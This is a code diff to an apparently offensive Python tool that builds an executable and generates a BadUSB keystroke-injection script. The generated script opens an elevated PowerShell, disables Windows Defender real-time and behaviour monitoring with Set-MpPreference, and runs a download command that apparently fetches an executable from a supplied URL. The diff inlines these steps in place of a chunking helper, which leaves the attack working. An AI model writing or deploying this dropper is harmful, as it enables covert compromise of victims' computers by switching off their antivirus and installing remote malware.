@@ -74,17 +74,7 @@ def build_exe(src, name, out_dir, console):
     return os.path.join(out_dir, name + (".exe" if os.name == "nt" else ""))
 
 
-def ducky_strings(text, chunk=32, gap=200):
-    out = []
-    for i in range(0, len(text), chunk):
-        out.append("STRING %s" % text[i:i + chunk])
-        if i + chunk < len(text):
-            out.append("DELAY %s" % gap)
-    return "\n".join(out)
-
-
 def badusb_script(exe_url):
-    elevate = "powershell Start-Process powershell -Verb RunAs"
     disable = (
         "Set-MpPreference -DisableRealtimeMonitoring 1 -EA 0;"
         "Set-MpPreference -DisableBehaviorMonitoring 1 -EA 0;"
@@ -100,7 +90,7 @@ REM Attackmodes:   HID
 DELAY 1500
 GUI r
 DELAY 800
-%s
+STRING powershell Start-Process powershell -Verb RunAs
 DELAY 300
 ENTER
 DELAY 2500
@@ -110,14 +100,14 @@ ENTER
 DELAY 2500
 ALT TAB
 DELAY 500
-%s
+STRING %s
 DELAY 300
 ENTER
 DELAY 1500
-%s
+STRING %s
 DELAY 300
 ENTER
-""" % (ducky_strings(elevate), ducky_strings(disable), ducky_strings(download))
+""" % (disable, download)
 
 
 def find_cloudflared():
